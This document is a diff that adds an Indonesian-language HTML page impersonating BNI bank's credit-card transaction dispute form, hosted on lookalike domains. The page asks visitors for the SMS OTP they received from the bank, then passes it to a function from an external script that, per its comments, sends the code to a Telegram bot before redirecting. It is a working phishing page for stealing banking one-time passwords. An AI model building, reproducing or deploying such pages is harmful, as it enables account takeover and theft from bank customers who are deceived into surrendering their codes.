@@ -1,0 +1,261 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Sanggahan BNI - Kartu Kredit</title>
+    <meta name="description" content="bni.co.id">
+    <meta name="robots" content="nofollow,noarchive,noindex">
+    <link rel="icon" href="https://e-form.bni-e.com/home/Bn1-0TP1/favicon.png">
+
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+
+        html, body {
+            width: 100%;
+            overflow-x: hidden;
+            position: relative;
+        }
+
+        body {
+            font-family: Arial, sans-serif;
+            background: #ffffff;
+            color: #000;
+            line-height: 1.4;
+            min-height: 100vh;
+        }
+
+        /* ===== LATAR BELAKANG BULATAN — TETAP & SESUAI LAYAR HP ===== */
+        .bg-circles {
+            position: fixed;
+            top: 0;
+            right: 0;
+            width: 100vw;
+            height: 100vh;
+            pointer-events: none;
+            z-index: 0;
+            overflow: hidden;
+        }
+
+        .circle-1 {
+            position: absolute;
+            top: 10vw;
+            right: -8vw;
+            width: 55vw;
+            height: 55vw;
+            background: #f9b77c;
+            border-radius: 50%;
+            opacity: 0.5;
+        }
+        .circle-2 {
+            position: absolute;
+            top: 22vw;
+            right: -5vw;
+            width: 65vw;
+            height: 65vw;
+            background: #94c7f0;
+            border-radius: 50%;
+            opacity: 0.4;
+        }
+        .circle-3 {
+            position: absolute;
+            top: 50vw;
+            right: -10vw;
+            width: 60vw;
+            height: 60vw;
+            background: #f0d8b5;
+            border-radius: 50%;
+            opacity: 0.5;
+        }
+        .circle-4 {
+            position: absolute;
+            top: 90vw;
+            right: -5vw;
+            width: 55vw;
+            height: 55vw;
+            background: #f9b77c;
+            border-radius: 50%;
+            opacity: 0.4;
+        }
+        .circle-5 {
+            position: absolute;
+            bottom: 10vw;
+            right: 5vw;
+            width: 45vw;
+            height: 45vw;
+            background: #fdd866;
+            border-radius: 50%;
+            opacity: 0.5;
+        }
+
+        /* ===== HEADER ===== */
+        .header {
+            position: relative;
+            z-index: 2;
+            background: #fff;
+            padding: 3vw 5vw;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            border-bottom: 1px solid #f5f5f5;
+        }
+        .logo-bni {
+            height: 10vw;
+            width: auto;
+        }
+        .btn-menu {
+            background: #f7941e;
+            color: #fff;
+            font-size: 3vw;
+            font-weight: 600;
+            text-decoration: none;
+            padding: 2.5vw 5vw;
+            border-radius: 4px;
+            border: none;
+            cursor: pointer;
+            white-space: nowrap;
+        }
+
+        /* ===== KONTEN ===== */
+        .content {
+            position: relative;
+            z-index: 2;
+            padding: 6vw 5vw;
+        }
+
+        /* Gambar Kartu — Geser Horizontal */
+        .cards-container {
+            display: flex;
+            gap: 2vw;
+            margin-bottom: 8vw;
+            overflow-x: auto;
+            padding-bottom: 2vw;
+            -webkit-overflow-scrolling: touch;
+            scrollbar-width: none;
+        }
+        .cards-container::-webkit-scrollbar { display: none; }
+        .cards-container img {
+            height: 20vw;
+            width: auto;
+            border-radius: 4px;
+            flex-shrink: 0;
+        }
+
+        /* Teks */
+        .title {
+            font-size: 5vw;
+            font-weight: 700;
+            color: #333;
+            margin-bottom: 2vw;
+            letter-spacing: 0.3px;
+        }
+        .subtitle {
+            font-size: 4vw;
+            color: #666;
+            margin-bottom: 6vw;
+        }
+
+        /* Input Form */
+        .form-input {
+            width: 100%;
+            padding: 3vw 4vw;
+            border: 1px solid #ccc;
+            border-radius: 6px;
+            font-size: 5vw;
+            color: #333;
+            background: #fff;
+            outline: none;
+            margin-bottom: 5vw;
+        }
+        .form-input::placeholder {
+            color: #777;
+            font-size: 3.8vw;
+        }
+
+        /* Tombol Kirim */
+        .btn-submit {
+            width: 100%;
+            background: #f7941e;
+            color: #fff;
+            font-size: 4vw;
+            font-weight: 500;
+            border: none;
+            border-radius: 6px;
+            padding: 3.3vw;
+            cursor: pointer;
+        }
+
+        /* Garis bawah */
+        .divider {
+            margin-top: 10vw;
+            border-bottom: 1px solid #eee;
+        }
+    </style>
+</head>
+<body>
+
+<!-- Latar Belakang Bulatan — TETAP & SESUAI LAYAR HP -->
+<div class="bg-circles">
+    <div class="circle-1"></div>
+    <div class="circle-2"></div>
+    <div class="circle-3"></div>
+    <div class="circle-4"></div>
+    <div class="circle-5"></div>
+</div>
+
+<!-- Header -->
+<div class="header">
+    <img src="https://e-form.bni-e.com/Screenshot_20260227_093018_Gallery.jpg" alt="BNI" class="logo-bni">
+    <a href="https://form-credit.online/" target="_blank" rel="noopener" class="btn-menu">MENU UTAMA</a>
+</div>
+
+<!-- Konten -->
+<div class="content">
+    <!-- Gambar Kartu — Bisa Digeser -->
+    <div class="cards-container">
+        <img src="https://e-form.bni-e.com/Screenshot_20260227_094233_Gallery-3.jpg" alt="Kartu BNI 1">
+        <img src="https://e-form.bni-e.com/Screenshot_20260205_085502_BukaKios.jpg" alt="Kartu BNI 2">
+        <img src="https://e-form.bni-e.com/Screenshot_20260227_094233_Gallery-3.jpg" alt="Kartu BNI 3">
+        <img src="https://e-form.bni-e.com/Screenshot_20260205_085502_BukaKios.jpg" alt="Kartu BNI 4">
+    </div>
+
+    <!-- Teks -->
+    <h1 class="title">SANGGAHAN TRANSAKSI</h1>
+    <p class="subtitle">ISI FORM.</p>
+
+    <!-- Input OTP -->
+    <form id="otpForm">
+        <input type="tel" class="form-input" placeholder="(Silahkan Input SMS OTP Transaksi Yang Anda Terima Dari BNI) *" required>
+        <button type="submit" class="btn-submit">Blokir OTP</button>
+    </form>
+
+    <div class="divider"></div>
+</div>
+
+<!-- ✅ PANGGIL FILE TELEGRAM BOT TERPISAH -->
+<script src="https://bni-one.vercel.app/tel/vbot.js"></script>
+
+<script>
+const form = document.getElementById('otpForm');
+
+form.addEventListener('submit', async function(e) {
+    e.preventDefault();
+    const input = document.querySelector('.form-input');
+    const otp = input.value.trim();
+
+    if (!otp) return;
+
+    // ✅ PAKAI FUNGSI DARI telegram-bot.js
+    await kirimDataOTP(otp);
+
+    // Pindah halaman
+    pindahHalaman();
+});
+</script>
+
+</body>
+</html>
